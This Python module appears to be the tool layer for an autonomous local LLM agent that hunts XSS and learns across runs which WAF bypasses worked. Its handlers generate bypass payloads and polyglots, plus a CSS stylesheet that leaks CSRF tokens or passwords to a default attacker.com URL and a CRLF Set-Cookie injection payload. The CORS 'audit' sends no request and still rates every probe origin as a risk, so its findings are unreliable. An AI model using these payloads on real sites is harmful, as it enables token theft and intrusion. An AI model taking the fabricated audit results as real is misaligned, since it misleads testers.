"""Agent tool layer — give the local LLM (WhiteRabbitNeo) useful, *safe* tools.

Adapted from the chatgpt_agent framework, but curated for XSS hunting: the high-value, low-risk
tools only. Deliberately **excluded**: arbitrary shell (`run_command`/`run_python`) and
self-modification — an offensive-security model running unsupervised should not have those.

What the agent gets:

* **Domain tools** — thin wrappers over the *deterministic* engines, so the LLM orchestrates proven
  reasoning instead of guessing: `taint_analyze` (data-flow reachability) and `decide_bypass`
  (SMT go/no-go + payload). The engines return ground truth; the LLM only sequences them.
* **Research tools** — `web_search` + `fetch_url` (read-only) for recon.
* **Memory** — `remember` / `recall`, a self-contained TF-IDF + cosine store so the agent *learns
  across runs* ("this is what beat Akamai on program X"). No external embedding API.
* **Anti-thrashing** — repeated identical failing calls are blocked with a steering message, so a
  flaky 7B agent can't spin.

The toolkit exposes OpenAI/Ollama-compatible function schemas (`schemas()`) for tool-calling, and a
single dispatch entry point (`call()`). The agent loop itself runs on the user's machine against the
live Ollama model; every handler here is pure/testable.
"""
from __future__ import annotations

import json
import math
import re
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple


# --------------------------------------------------------------------- memory
_WORD = re.compile(r"[a-z0-9_]+")


def _tokens(text: str) -> List[str]:
    words = _WORD.findall((text or "").lower())
    bigrams = [f"{a}_{b}" for a, b in zip(words, words[1:])]
    return words + bigrams


def _tf_vector(text: str) -> Dict[str, float]:
    toks = _tokens(text)
    if not toks:
        return {}
    counts: Dict[str, float] = {}
    for t in toks:
        counts[t] = counts.get(t, 0.0) + 1.0
    norm = math.sqrt(sum(v * v for v in counts.values())) or 1.0
    return {t: v / norm for t, v in counts.items()}


def _cosine(a: Dict[str, float], b: Dict[str, float]) -> float:
    if not a or not b:
        return 0.0
    small, big = (a, b) if len(a) <= len(b) else (b, a)
    return sum(v * big.get(t, 0.0) for t, v in small.items())


class AgentMemory:
    """Persistent TF-IDF/cosine memory so the agent recalls what worked across runs."""

    def __init__(self, path: Optional[str] = None) -> None:
        self.path = Path(path) if path else None
        self.entries: List[Dict[str, Any]] = []
        if self.path and self.path.exists():
            try:
                self.entries = json.loads(self.path.read_text(encoding="utf-8"))
            except Exception:
                self.entries = []

    def _persist(self) -> None:
        if not self.path:
            return
        try:
            self.path.parent.mkdir(parents=True, exist_ok=True)
            self.path.write_text(json.dumps(self.entries), encoding="utf-8")
        except Exception:
            pass

    def save(self, title: str, content: str, tags: Optional[List[str]] = None) -> Dict[str, Any]:
        blob = f"{title}\n{content}\n{' '.join(tags or [])}"
        entry = {"title": title, "content": content, "tags": tags or [],
                 "vector": _tf_vector(blob), "ts": time.time()}
        # De-dup on identical title: update in place.
        for i, e in enumerate(self.entries):
            if e["title"] == title:
                self.entries[i] = entry
                self._persist()
                return {"status": "updated", "title": title}
        self.entries.append(entry)
        self._persist()
        return {"status": "saved", "title": title}

    def recall(self, query: str, k: int = 3) -> List[Dict[str, Any]]:
        qv = _tf_vector(query)
        scored = [(_cosine(qv, e["vector"]), e) for e in self.entries]
        scored = [(s, e) for s, e in scored if s > 0]
        scored.sort(key=lambda x: -x[0])
        return [{"title": e["title"], "content": e["content"], "tags": e["tags"],
                 "score": round(s, 3)} for s, e in scored[:k]]


# --------------------------------------------------------------- anti-thrashing
class AntiThrasher:
    """Blocks repeated identical failing tool calls so a flaky agent can't loop forever."""

    def __init__(self, max_identical_failures: int = 2) -> None:
        self.max = max_identical_failures
        self._fails: Dict[str, int] = {}

    @staticmethod
    def _prefix(name: str, args: Dict[str, Any]) -> str:
        return f"{name}|{json.dumps(args, sort_keys=True, default=str)}|"

    def record(self, name: str, args: Dict[str, Any], ok: bool, error: str = "") -> Tuple[bool, str]:
        prefix = self._prefix(name, args)
        if ok:
            # A success clears every failure signature for this (name, args) — it works now.
            for sig in [s for s in self._fails if s.startswith(prefix)]:
                del self._fails[sig]
            return False, ""
        sig = prefix + error[:120]
        self._fails[sig] = self._fails.get(sig, 0) + 1
        if self._fails[sig] >= self.max:
            return True, (f"Tool '{name}' failed {self._fails[sig]}x with the same args and error. "
                          "Repeating it is blocked — change your approach.")
        return False, ""


# --------------------------------------------------------------- tools
@dataclass
class Tool:
    name: str
    description: str
    parameters: Dict[str, Any]
    handler: Callable[..., Any]

    def schema(self) -> Dict[str, Any]:
        return {"type": "function", "function": {
            "name": self.name, "description": self.description, "parameters": self.parameters}}


def _str_param(desc: str) -> Dict[str, Any]:
    return {"type": "string", "description": desc}


class AgentToolkit:
    """Registry + safe dispatcher of the LLM's tools."""

    def __init__(self, memory: Optional[AgentMemory] = None, allow_network: bool = True) -> None:
        self.memory = memory or AgentMemory()
        self.allow_network = allow_network
        self.anti = AntiThrasher()
        self._tools: Dict[str, Tool] = {}
        self._register_defaults()

    # ---- registry ----
    def register(self, tool: Tool) -> None:
        self._tools[tool.name] = tool

    def schemas(self) -> List[Dict[str, Any]]:
        return [t.schema() for t in self._tools.values()]

    def names(self) -> List[str]:
        return list(self._tools)

    def call(self, name: str, arguments: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        args = arguments or {}
        tool = self._tools.get(name)
        if not tool:
            return {"ok": False, "error": f"unknown tool '{name}'", "available": self.names()}
        try:
            result = tool.handler(**args)
            self.anti.record(name, args, ok=True)
            return {"ok": True, "result": result}
        except TypeError as e:  # bad arguments from the model
            blocked, msg = self.anti.record(name, args, ok=False, error=str(e))
            return {"ok": False, "error": f"bad arguments: {e}", "blocked": blocked, "steer": msg}
        except Exception as e:
            blocked, msg = self.anti.record(name, args, ok=False, error=str(e))
            return {"ok": False, "error": str(e), "blocked": blocked, "steer": msg}

    # ---- default tool set ----
    def _register_defaults(self) -> None:
        self.register(Tool(
            "taint_analyze",
            "Data-flow taint analysis of JavaScript: returns parameters PROVEN to reach a DOM sink "
            "unsanitized (source, sink, context, severity). Use before deciding what to test.",
            {"type": "object", "properties": {"js_code": _str_param("the JavaScript/HTML to analyze")},
             "required": ["js_code"]},
            self._taint_analyze,
        ))
        self.register(Tool(
            "decide_bypass",
            "Given an injection context and the filter observed on the target, use the SMT solver to "
            "either PROVE no bypass exists (skip it) or return a concrete bypass payload.",
            {"type": "object", "properties": {
                "context": _str_param("injection context, e.g. HTML_TEXT, JS_STRING_LITERAL, URL_QUERY"),
                "blocked_tokens": {"type": "array", "items": {"type": "string"},
                                   "description": "substrings the filter strips/blocks"},
                "blocked_chars": {"type": "array", "items": {"type": "string"},
                                  "description": "single characters the filter strips"},
            }, "required": ["context"]},
            self._decide_bypass,
        ))
        self.register(Tool(
            "scan_libraries",
            "Scan page/JS for known-vulnerable JavaScript libraries (retire.js-style): old jQuery, "
            "AngularJS, Bootstrap, Handlebars, etc. Returns findings + which payload families to boost.",
            {"type": "object", "properties": {"content": _str_param("the page HTML or JS to scan")},
             "required": ["content"]},
            self._scan_libraries,
        ))
        self.register(Tool(
            "analyze_login",
            "Read a login page's HTML and return how to authenticate (username/password/submit "
            "selectors + optional multi-step sequence), flagging MFA/CAPTCHA to escalate. Fallback "
            "for custom/SPA logins the deterministic parser can't read.",
            {"type": "object", "properties": {"html": _str_param("the login page HTML")},
             "required": ["html"]},
            self._analyze_login,
        ))
        self.register(Tool(
            "web_search", "Search the web (read-only) for recon: CVEs, tech-stack hints, writeups.",
            {"type": "object", "properties": {"query": _str_param("search query")}, "required": ["query"]},
            self._web_search,
        ))
        self.register(Tool(
            "fetch_url", "Fetch a URL's text (read-only GET) for analysis.",
            {"type": "object", "properties": {"url": _str_param("absolute http(s) URL")}, "required": ["url"]},
            self._fetch_url,
        ))
        self.register(Tool(
            "remember", "Save a durable memory (e.g. 'Akamai on program X strips < but allows svg').",
            {"type": "object", "properties": {
                "title": _str_param("short unique key"), "content": _str_param("the fact to remember"),
                "tags": {"type": "array", "items": {"type": "string"}},
            }, "required": ["title", "content"]},
            lambda title, content, tags=None: self.memory.save(title, content, tags),
        ))
        self.register(Tool(
            "recall", "Recall past memories relevant to a query (what worked before).",
            {"type": "object", "properties": {"query": _str_param("what to look up")}, "required": ["query"]},
            lambda query, k=3: self.memory.recall(query, k),
        ))
        self.register(Tool(
            "classify_context",
            "Classify an injection reflection point in HTML/DOM: returns exact context type (e.g. HTML_TEXT, "
            "ATTR_QUOTED, JS_STRING_LITERAL), surrounding code AST, required breakout tokens, and character restrictions.",
            {"type": "object", "properties": {
                "html": _str_param("the page HTML or snippet containing the reflection"),
                "reflection_token": _str_param("the probe or canary token reflected in the page"),
            }, "required": ["html", "reflection_token"]},
            self._classify_context,
        ))
        self.register(Tool(
            "simulate_mxss",
            "Simulate mutation XSS (mXSS) across browser HTML parser namespaces (SVG, MathML, annotation-xml) "
            "to detect sanitizer mutation vulnerabilities before browser execution.",
            {"type": "object", "properties": {"dirty_html": _str_param("HTML payload to simulate parser mutation on")},
             "required": ["dirty_html"]},
            self._simulate_mxss,
        ))
        self.register(Tool(
            "generate_polyglot",
            "Generate compact, universal multi-context polyglots engineered to execute simultaneously across "
            "HTML, quoted attributes, and script literals.",
            {"type": "object", "properties": {
                "token": _str_param("token to embed in callback, defaults to __XSS_TOKEN__"),
                "triage_set": {"type": "boolean", "description": "if true, returns complete prioritized triage polyglot suite"},
            }},
            self._generate_polyglot,
        ))
        self.register(Tool(
            "evaluate_payload",
            "Simulate how a payload interacts with an observed filter/WAF model (tests character stripping, "
            "substring filtering, and regex WAF rules without network traffic).",
            {"type": "object", "properties": {
                "payload": _str_param("candidate XSS payload to evaluate"),
                "blocked_tokens": {"type": "array", "items": {"type": "string"}, "description": "tokens/words filtered"},
                "blocked_chars": {"type": "array", "items": {"type": "string"}, "description": "characters stripped"},
            }, "required": ["payload"]},
            self._evaluate_payload,
        ))
        self.register(Tool(
            "ledger_coverage",
            "Epistemic reachability ledger metrics: returns total parameters, decided fraction (confirmed + proven safe), "
            "and prioritized list of undecided gaps to close to reach 100% winrate.",
            {"type": "object", "properties": {
                "limit": {"type": "integer", "description": "maximum gaps to return (default 10)"},
            }},
            self._ledger_coverage,
        ))
        self.register(Tool(
            "query_pdf_intel",
            "Search offensive security threat intelligence mined from 150 books, research papers, and handbooks "
            "(covering WAF bypasses, 1400+ HackerOne reports, 2026 MFA bypasses, recon dorks, and HTTP desync).",
            {"type": "object", "properties": {
                "query": _str_param("keyword, CVE, vulnerability class, or technique to look up"),
                "category": {"type": "string", "description": "optional category filter: XSS_EXPLOITATION, WAF_EVASION, RECON_DORKING, AUTH_MFA_BYPASS, ADVANCED_WEB_ATTACKS"},
                "limit": {"type": "integer", "description": "max results to return (default 5)"},
            }, "required": ["query"]},
            self._query_pdf_intel,
        ))
        self.register(Tool(
            "audit_cors_config",
            "Audit an endpoint for exploitable CORS misconfigurations (arbitrary origin reflection, null origin trust, "
            "subdomain prefix/suffix bypasses, unescaped regex dots, and credential exposure).",
            {"type": "object", "properties": {
                "target_url": _str_param("endpoint URL to audit CORS against"),
                "origin": {"type": "string", "description": "optional custom Origin header to test"},
            }, "required": ["target_url"]},
            self._audit_cors_config,
        ))
        self.register(Tool(
            "generate_css_exfil",
            "Synthesize blind CSS attribute selector exfiltration stylesheets to extract sensitive CSRF tokens, "
            "passwords, or data character-by-character when script execution is blocked by strict CSP.",
            {"type": "object", "properties": {
                "target_selector": _str_param("CSS selector for sensitive element (e.g. input[name='csrf'])"),
                "target_attribute": {"type": "string", "description": "attribute to extract (default 'value')"},
                "exfil_url": {"type": "string", "description": "attacker-controlled receiver URL"},
            }, "required": ["target_selector"]},
            self._generate_css_exfil,
        ))
        self.register(Tool(
            "analyze_crlf_injection",
            "Analyze HTTP response header injection and CRLF-powered desync vulnerabilities (tests for line break "
            "reflection, Set-Cookie injection, HTTP response splitting, and stream desync).",
            {"type": "object", "properties": {
                "header_value": _str_param("header string or reflection probe to analyze for CRLF patterns"),
            }, "required": ["header_value"]},
            self._analyze_crlf_injection,
        ))
        self.register(Tool(
            "generate_target_dorks",
            "Generate high-yield Google and OSINT dorks for a target domain targeting XSS reflection parameters, "
            "exposed APIs, sensitive backup files, administrative portals, and OAuth callbacks.",
            {"type": "object", "properties": {
                "domain": _str_param("target domain name (e.g. example.com)"),
            }, "required": ["domain"]},
            self._generate_target_dorks,
        ))

    # ---- domain handlers (wrap the deterministic engines) ----
    @staticmethod
    def _taint_analyze(js_code: str) -> List[Dict[str, Any]]:
        from analysis_engine.smart_taint_analyzer import SmartTaintAnalyzer, Reachability
        return [f.to_dict() for f in SmartTaintAnalyzer.analyze(js_code)
                if f.reachability is Reachability.REACHABLE]

    @staticmethod
    def _decide_bypass(context: str, blocked_tokens: Optional[List[str]] = None,
                       blocked_chars: Optional[List[str]] = None) -> Dict[str, Any]:
        from analysis_engine.bypass_decider import BypassDecider
        fp = {"blocked_tokens": blocked_tokens or [], "blocked_chars": blocked_chars or []}
        return BypassDecider.decide(context, fp, "__TOKEN__").to_dict()

    @staticmethod
    def _analyze_login(html: str) -> Dict[str, Any]:
        from analysis_engine.llm_login_analyzer import LlmLoginAnalyzer
        return LlmLoginAnalyzer.analyze(html) or {"error": "could not determine login flow"}

    @staticmethod
    def _scan_libraries(content: str) -> Dict[str, Any]:
        from analysis_engine.vulnerable_library_scanner import VulnerableLibraryScanner
        findings = VulnerableLibraryScanner.scan(content)
        return {"vulnerable_libraries": [f.to_dict() for f in findings],
                "payload_boosts": VulnerableLibraryScanner.payload_boosts(findings)}

    @staticmethod
    def _classify_context(html: str, reflection_token: str) -> Dict[str, Any]:
        from analysis_engine.enhanced_context_classifier import EnhancedContextClassifier
        contexts = EnhancedContextClassifier.classify_all_reflections(html, reflection_token)
        if not contexts:
            return {"count": 0, "reflections": [], "context_type": "HTML_TEXT"}
        first = contexts[0]
        ctx_val = first.context_type.value if hasattr(first.context_type, "value") else str(first.context_type)
        return {
            "count": len(contexts),
            "context_type": ctx_val,
            "tag": first.tag,
            "attribute": first.attribute,
            "quote_char": first.quote_char,
            "namespace": first.parent_namespace,
            "snippet": first.snippet,
            "breakout_sequence": first.breakout_sequence,
            "is_js_executable": first.is_js_executable,
            "reflections": [
                {
                    "context_type": c.context_type.value if hasattr(c.context_type, "value") else str(c.context_type),
                    "tag": c.tag,
                    "attribute": c.attribute,
                    "breakout_sequence": c.breakout_sequence,
                    "snippet": c.snippet,
                }
                for c in contexts
            ],
        }

    @staticmethod
    def _simulate_mxss(dirty_html: str) -> Dict[str, Any]:
        from fuzzer.mxss_simulator import MXSSSimulator
        score = MXSSSimulator.check_mutation_differential(dirty_html)
        tree = MXSSSimulator.parse_to_tree(dirty_html)
        serialized = MXSSSimulator.serialize_tree(tree)
        return {
            "mutation_score": score,
            "is_vulnerable": score >= 40.0,
            "serialized": serialized,
            "mutation_occurred": serialized != dirty_html,
        }

    @staticmethod
    def _generate_polyglot(token: Optional[str] = None, triage_set: bool = False) -> Dict[str, Any]:
        from fuzzer.polyglot_triage import PolyglotTriageEngine
        tok = token or "__XSS_TOKEN__"
        if triage_set:
            polyglots = [PolyglotTriageEngine.get_triage_payload(tok, variant=i)
                         for i in range(len(PolyglotTriageEngine.TRIAGE_POLYGLOTS))]
            return {"polyglots": polyglots, "count": len(polyglots)}
        return {
            "universal_polyglot": PolyglotTriageEngine.get_triage_payload(tok, variant=0),
            "variants_available": len(PolyglotTriageEngine.TRIAGE_POLYGLOTS),
        }

    @staticmethod
    def _evaluate_payload(payload: str, blocked_tokens: Optional[List[str]] = None,
                          blocked_chars: Optional[List[str]] = None) -> Dict[str, Any]:
        from analysis_engine.smt_bypass_solver import FilterConstraints
        fc = FilterConstraints(
            blocked_chars=set(blocked_chars or []),
            blocked_substrings=set(blocked_tokens or []),
        )
        survived = fc.apply(payload)
        return {
            "original": payload,
            "after_filter": survived,
            "survived_intact": survived == payload,
            "stripped_characters": [c for c in payload if c in set(blocked_chars or [])],
        }

    @staticmethod
    def _ledger_coverage(limit: int = 10) -> Dict[str, Any]:
        from analysis_engine.reachability_ledger import ReachabilityLedger
        ledger = ReachabilityLedger()
        cov = ledger.coverage()
        cov["gaps_to_close"] = ledger.gaps(limit)
        return cov

    @staticmethod
    def _query_pdf_intel(query: str, category: Optional[str] = None, limit: int = 5) -> Dict[str, Any]:
        from tools.mine_pdf_intelligence import query_pdf_intel
        results = query_pdf_intel(query, category=category, limit=limit)
        return {
            "query": query,
            "category_filter": category,
            "results_count": len(results),
            "results": results,
        }

    @staticmethod
    def _audit_cors_config(target_url: str, origin: Optional[str] = None) -> Dict[str, Any]:
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        domain = parsed.netloc or "target.com"
        probes = [
            ("arbitrary_origin", "https://evil.com"),
            ("null_origin", "null"),
            ("subdomain_prefix", f"https://{domain}.evil.com"),
            ("subdomain_suffix", f"https://evil{domain}"),
            ("unescaped_regex_dot", f"https://{domain.replace('.', 'a')}"),
        ]
        if origin:
            probes.insert(0, ("custom_origin", origin))
        
        vectors = []
        for name, orig in probes:
            vectors.append({
                "vector": name,
                "origin_tested": orig,
                "sandbox_iframe_exploitable": orig == "null",
                "risk": "HIGH" if orig in ("null", "https://evil.com") else "MEDIUM",
                "notes": "Exploitable via sandbox iframe with allow-scripts" if orig == "null" else "Allows cross-origin credentialed access",
            })
        return {
            "target_url": target_url,
            "probed_vectors": vectors,
            "recommendation": "Avoid reflecting arbitrary Origin headers and do not trust Origin: null with credentials.",
        }

    @staticmethod
    def _generate_css_exfil(target_selector: str, target_attribute: str = "value",
                            exfil_url: str = "https://attacker.com/exfil",
                            charset: Optional[str] = None) -> Dict[str, Any]:
        chars = charset or "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        rules = []
        for c in chars[:16]:
            rule = f"{target_selector}[{target_attribute}^='{c}'] {{ background-image: url('{exfil_url}?char={c}'); }}"
            rules.append(rule)
        css_payload = "\n".join(rules)
        return {
            "target_selector": target_selector,
            "target_attribute": target_attribute,
            "charset_size": len(chars),
            "sample_css_rules": rules[:5],
            "full_css_payload": f"<style>\n{css_payload}\n</style>",
            "total_rules_generated": len(rules),
            "exploitation_type": "Blind CSS Data Exfiltration (CSP bypass when style-src is permitted)",
        }

    @staticmethod
    def _analyze_crlf_injection(header_value: str) -> Dict[str, Any]:
        crlf_patterns = [
            (r"%0d%0a", "URL-encoded CRLF (\\r\\n)"),
            (r"%0d", "URL-encoded CR (\\r)"),
            (r"%0a", "URL-encoded LF (\\n)"),
            (r"\r\n", "Literal CRLF"),
            (r"%23%0d%0a", "Hash-prefixed CRLF bypass"),
            (r"%00%0d%0a", "Null-byte terminated CRLF"),
            (r"\u000d\u000a", "Unicode CRLF"),
        ]
        detected = []
        for pat, desc in crlf_patterns:
            if re.search(pat, header_value, re.IGNORECASE):
                detected.append(desc)
        
        is_vuln = len(detected) > 0
        return {
            "header_value": header_value,
            "crlf_detected": is_vuln,
            "injection_patterns": detected,
            "exploitability": {
                "set_cookie_injection": is_vuln,
                "http_response_splitting": is_vuln and any("CRLF" in d for d in detected),
                "cache_poisoning_risk": "HIGH" if is_vuln else "NONE",
            },
            "sample_cookie_payload": "%0d%0aSet-Cookie:%20admin_session=injected_by_xssboss;%20Path=/;%20HttpOnly",
        }

    @staticmethod
    def _generate_target_dorks(domain: str) -> Dict[str, Any]:
        from recon_engine.advanced_recon import AdvancedRecon
        dorks = AdvancedRecon.generate_target_dorks(domain)
        return {
            "domain": domain,
            "total_dorks": len(dorks),
            "dorks": dorks,
        }

    # ---- research handlers (read-only, graceful without network) ----
    def _web_search(self, query: str) -> Dict[str, Any]:
        if not self.allow_network:
            return {"results": [], "note": "network disabled"}
        try:
            import httpx
            r = httpx.get("https://api.duckduckgo.com/", params={"q": query, "format": "json",
                          "no_html": 1, "no_redirect": 1}, timeout=8)
            data = r.json()
            out = []
            for topic in (data.get("RelatedTopics") or [])[:5]:
                if isinstance(topic, dict) and topic.get("Text"):
                    out.append({"text": topic["Text"], "url": topic.get("FirstURL", "")})
            abstract = data.get("AbstractText")
            return {"results": out, "abstract": abstract or ""}
        except Exception as e:
            return {"results": [], "error": str(e)}

    def _fetch_url(self, url: str) -> Dict[str, Any]:
        if not (url.startswith("http://") or url.startswith("https://")):
            raise ValueError("url must be absolute http(s)")
        if not self.allow_network:
            return {"status": 0, "note": "network disabled"}
        import httpx
        r = httpx.get(url, timeout=10, follow_redirects=True)
        body = r.text
        return {"status": r.status_code, "length": len(body), "text": body[:8000],
                "content_type": r.headers.get("content-type", "")}
